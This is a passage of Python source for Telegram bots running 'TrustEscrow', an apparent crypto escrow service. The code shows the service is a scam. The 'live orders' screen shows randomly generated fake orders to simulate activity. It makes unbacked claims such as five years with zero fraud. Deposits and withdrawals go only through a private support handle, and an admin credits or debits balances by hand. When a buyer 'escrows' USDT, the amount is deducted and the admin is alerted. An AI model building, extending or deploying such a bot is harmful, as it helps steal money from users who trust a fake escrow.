✅ 口令配對、簡單快速
✅ 7×24線上客服支援
安全交易，從這裡開始。""",
        "about": """🏛️ 關於我們
TrustEscrow 已在擔保行業立足 5 年，是業內最專業、最具信譽的老牌擔保平台。""",
        "service": """📌 服務介紹
我們專注「中間人墊資擔保」模式，徹底解決線上交易不信任痛點。""",
        "safety": """🛡️ 安全保障
我們的機制讓你交易零擔心：買方資金 100% 平台託管、賣方確認收款才發貨。""",
        "help": """📞 幫助中心
任何問題請立即聯繫官方客服：➡️ @fcff88""",
        "deposit": """💰 儲值入口
僅透過官方客服處理儲值，保障資金安全。➡️ @fcff88""",
        "withdraw": """💳 提現入口
提現僅透過官方客服審核處理。➡️ @fcff88""",
        "history": """📜 擔保歷史
你的個人擔保記錄，所有訂單可查、不可刪除。""",
        "running": """🚨 平台實時擔保中訂單
━━━━━━━━━━━━━━━━━━━
{}
━━━━━━━━━━━━━━━━━━━
🔥 每秒都有訂單在成交
安全 · 熱門 · 專業 · 可靠""",
        "personal": """👤 個人中心
🆔 用戶ID: {}
💰 錢包餘額: {:.2f} USDT""",
        "create_escrow": "🚀 發起擔保",
        "join_escrow": "📥 輸入口令擔保",
        "input_amount": "💰 請輸入擔保金額（USDT）：",
        "input_tip": "🔒 請設置交易口令：",
        "input_sell_tip": "🔑 請輸入擔保口令：",
        "escrow_success": "✅ 擔保已發起！\n金額: {:.2f} USDT\n口令: {}\n📅 創建時間: {}\n請發送給賣方。",
        "pair_success": "✅ 訂單配對成功！\n買方: {}\n賣方: {}\n金額: {:.2f} USDT\n📅 時間: {}\n管理員已接收。",
        "no_money": "❌ 餘額不足",
        "tip_error": "❌ 口令錯誤",
        "back": "🏠 返回首頁",
        "lang": "🌐 English",
        "merchant": """🏪 商家·擔保入驻
想成為平台認證商家、開通專屬擔保權限？
請前往官方入驻機器人辦理：
✅ 商家認證
✅ 擔保權限開通
✅ 專屬額度與權益
✅ 24小時快速審核""",
    },
    "en": {
        "home": """🏠 TrustEscrow Professional Escrow
We have 5+ years experience in secure escrow service.
【Features】
✅ 5 Years 0 Fraud
✅ Professional Guarantor Escrow
✅ 100% Safe Fund Custody
✅ Fast Code Pairing
✅ 24/7 Support
Trade with confidence.""",
        "about": """🏛️ About Us
TrustEscrow: 5+ years trusted by thousands of users.""",
        "service": """📌 Services
Professional guarantor escrow for safe online transactions.""",
        "safety": """🛡️ Security
100% fund custody, seller gets paid only after confirmation.""",
        "help": """📞 Help Center
Contact support: @fcff88""",
        "deposit": """💰 Deposit
Only via official support: @fcff88""",
        "withdraw": """💳 Withdraw
Processed only by admin: @fcff88""",
        "history": """📜 Escrow History""",
        "running": """🚨 LIVE ORDERS
━━━━━━━━━━━━━━━━━━━
{}
━━━━━━━━━━━━━━━━━━━
Safe · Hot · Professional · Reliable""",
        "personal": """👤 Profile
🆔 ID: {}
💰 Balance: {:.2f} USDT""",
        "create_escrow": "🚀 Create Escrow",
        "join_escrow": "📥 Enter Code",
        "input_amount": "💰 Enter amount (USDT):",
        "input_tip": "🔒 Set your code:",
        "input_sell_tip": "🔑 Enter code:",
        "escrow_success": "✅ Escrow created!\nAmount: {:.2f} USDT\nCode: {}\n📅 Created: {}\nSend to seller.",
        "pair_success": "✅ Paired!\nBuyer: {}\nSeller: {}\nAmount: {:.2f} USDT\n📅 Time: {}\nAdmin notified.",
        "no_money": "❌ Insufficient balance",
        "tip_error": "❌ Invalid code",
        "back": "🏠 Home",
        "lang": "🌐 繁中",
        "merchant": """🏪 Merchant Registration
Go to official bot for merchant verification.""",
    }
}

def main_menu2(user_id):
    lang = user_lang2.get(user_id, "zh")
    t = TEXT_B[lang]
    m = InlineKeyboardMarkup(row_width=2)
    m.add(
        InlineKeyboardButton(t["create_escrow"], callback_data="create"),
        InlineKeyboardButton(t["join_escrow"], callback_data="join"),
        InlineKeyboardButton("🏪 商家入驻" if lang=="zh" else "🏪 Merchant", callback_data="merchant"),
        InlineKeyboardButton("👤 個人中心" if lang=="zh" else "👤 Profile", callback_data="personal"),
        InlineKeyboardButton("🚨 實時擔保" if lang=="zh" else "🚨 LIVE", callback_data="running"),
        InlineKeyboardButton(t["deposit"].split("\n")[0], callback_data="deposit"),
        InlineKeyboardButton(t["withdraw"].split("\n")[0], callback_data="withdraw"),
        InlineKeyboardButton(t["history"], callback_data="history"),
        InlineKeyboardButton("📌 服務" if lang=="zh" else "📌 Service", callback_data="service"),
        InlineKeyboardButton("🛡️ 安全" if lang=="zh" else "🛡️ Security", callback_data="safety"),
        InlineKeyboardButton(t["about"].split("\n")[0], callback_data="about"),
        InlineKeyboardButton(t["help"].split("\n")[0], callback_data="help"),
        InlineKeyboardButton(t["lang"], callback_data="lang"),
    )
    return m

def back_menu2(user_id):
    lang = user_lang2.get(user_id, "zh")
    t = TEXT_B[lang]
    m = InlineKeyboardMarkup(row_width=1)
    m.add(InlineKeyboardButton(t["back"], callback_data="home"))
    return m

def merchant_menu2(user_id):
    lang = user_lang2.get(user_id, "zh")
    t = TEXT_B[lang]
    m = InlineKeyboardMarkup(row_width=1)
    m.add(
        InlineKeyboardButton("👉 前往入驻機器人" if lang == "zh" else "👉 Register Bot",
                             url="https://t.me/secureescrow_pro_bot"),
        InlineKeyboardButton(t["back"], callback_data="home")
    )
    return m

@bot2.message_handler(commands=['start'])
def start_b(msg):
    try:
        u = msg.from_user.id
        user_lang2.setdefault(u, "zh")
        user_step2[u] = None
        user_balance2.setdefault(u, 0.0)
        t = TEXT_B[user_lang2[u]]
        bot2.send_message(msg.chat.id, t["home"], reply_markup=main_menu2(u))
    except:
        pass

@bot2.callback_query_handler(func=lambda c: True)
def callback_b(c):
    try:
        u = c.from_user.id
        lang = user_lang2.get(u, "zh")
        t = TEXT_B[lang]
        mid = c.message.message_id
        cid = c.message.chat.id

        if c.data == "home":
            user_step2[u] = None
            bot2.edit_message_text(t["home"], cid, mid, reply_markup=main_menu2(u))

        elif c.data == "lang":
            user_lang2[u] = "en" if lang == "zh" else "zh"
            new_lang = user_lang2[u]
            new_t = TEXT_B[new_lang]
            bot2.edit_message_text(new_t["home"], cid, mid, reply_markup=main_menu2(u))

        elif c.data == "personal":
            bal = user_balance2.get(u, 0.0)
            txt = t["personal"].format(u, bal)
            bot2.edit_message_text(txt, cid, mid, reply_markup=back_menu2(u))

        elif c.data == "running":
            items = []
            for i in range(4):
                code = "".join(random.choices("ABCDEFGHJKLMNPQRSTUVWXYZ0123456789", k=4))
                amt = random.choice([380, 500, 680, 880, 1000, 1200, 1500, 1800, 2000, 2500])
                st = random.choice(["擔保處理中", "賣方已收款", "待配對"] if lang == "zh" else ["Processing", "Paid", "Pairing"])
                items.append(f"⏳ 訂單 #{code}\n金額：{amt} USDT\n狀態：{st}")
            text = t["running"].format("\n\n".join(items))
            bot2.edit_message_text(text, cid, mid, reply_markup=back_menu2(u))

        elif c.data == "about":
            bot2.edit_message_text(t["about"], cid, mid, reply_markup=back_menu2(u))

        elif c.data == "service":
            bot2.edit_message_text(t["service"], cid, mid, reply_markup=back_menu2(u))

        elif c.data == "safety":
            bot2.edit_message_text(t["safety"], cid, mid, reply_markup=back_menu2(u))

        elif c.data == "help":
            bot2.edit_message_text(t["help"], cid, mid, reply_markup=back_menu2(u))

        elif c.data == "deposit":
            bot2.edit_message_text(t["deposit"], cid, mid, reply_markup=back_menu2(u))

        elif c.data == "withdraw":
            bot2.edit_message_text(t["withdraw"], cid, mid, reply_markup=back_menu2(u))

        elif c.data == "history":
            bot2.edit_message_text(t["history"], cid, mid, reply_markup=back_menu2(u))

        elif c.data == "create":
            user_step2[u] = "create_amount"
            bot2.edit_message_text(t["input_amount"], cid, mid, reply_markup=back_menu2(u))

        elif c.data == "join":
            user_step2[u] = "join_tip"
            bot2.edit_message_text(t["input_sell_tip"], cid, mid, reply_markup=back_menu2(u))

        elif c.data == "merchant":
            bot2.edit_message_text(t["merchant"], cid, mid, reply_markup=merchant_menu2(u))

        bot2.answer_callback_query(c.id)
    except:
        pass

@bot2.message_handler(func=lambda m: True)
def msg_b(msg):
    try:
        u = msg.from_user.id
        cid = msg.chat.id
        txt = msg.text.strip()
        lang = user_lang2.get(u, "zh")
        t = TEXT_B[lang]

        if u == ADMIN_ID_B and txt.startswith("+U "):
            arr = txt.split()
            if len(arr) == 3:
                uid = int(arr[1])
                amt = float(arr[2])
                user_balance2[uid] = user_balance2.get(uid, 0.0) + amt
                bot2.send_message(cid, f"✅ +{amt} USDT → {uid}")
            return

        if u == ADMIN_ID_B and txt.startswith("-U "):
            arr = txt.split()
            if len(arr) == 3:
                uid = int(arr[1])
                amt = float(arr[2])
                user_balance2[uid] = max(0.0, user_balance2.get(uid, 0.0) - amt)
                bot2.send_message(cid, f"✅ -{amt} USDT → {uid}")
            return

        if user_step2.get(u) == "create_amount":
            try:
                amt = float(txt)
                user_step2[u] = {"step": "create_tip", "amount": amt}
                bot2.send_message(cid, t["input_tip"], reply_markup=back_menu2(u))
            except:
                bot2.send_message(cid, "❌ 請輸入有效數字", reply_markup=back_menu2(u))
            return

        step = user_step2.get(u)
        if isinstance(step, dict) and step.get("step") == "create_tip":
            amt = step["amount"]
            code = txt.strip()
            if user_balance2.get(u, 0) >= amt:
                user_balance2[u] -= amt
                create_time = datetime.now().strftime("%m-%d %H:%M")
                orders2[code] = {"buyer": u, "amount": amt, "time": create_time}
                bot2.send_message(cid, t["escrow_success"].format(amt, code, create_time), reply_markup=main_menu2(u))
                user_step2[u] = None
            else:
                bot2.send_message(cid, t["no_money"], reply_markup=main_menu2(u))
                user_step2[u] = None
            return

        if user_step2.get(u) == "join_tip":
            code = txt.strip()
            if code not in orders2:
                bot2.send_message(cid, t["tip_error"], reply_markup=main_menu2(u))
                user_step2[u] = None
                return
            o = orders2[code]
            pair_time = datetime.now().strftime("%m-%d %H:%M")
            bot2.send_message(cid, t["pair_success"].format(o["buyer"], u, o["amount"], pair_time), reply_markup=main_menu2(u))
            try:
                bot2.send_message(ADMIN_ID_B, f"📥 新訂單\n口令：{code}\n買方：{o['buyer']}\n賣方：{u}\n金額：{o['amount']} USDT\n📅 {pair_time}")
            except:
                pass
            del orders2[code]
            user_step2[u] = None
            return

    except Exception as e:
        print(f"msg_b error: {e}")
        pass

# ==============================================================================
# ========================== 启动双机器人（完全不变）========================
# ==============================================================================
def run_bot1():
    try:
        bot1.infinity_polling(timeout=60, none_stop=True)
    except:
        pass

def run_bot2():
    try:
        bot2.infinity_polling(timeout=60, none_stop=True)
    except:
        pass

if __name__ == "__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    threading.Thread(target=refresh_virtual_orders1, daemon=True).start()
    threading.Thread(target=auto_clean_orders, daemon=True).start()
    threading.Thread(target=run_bot1, daemon=True).start()
    threading.Thread(target=run_bot2, daemon=True).start()
    while True:
        time.sleep(1)
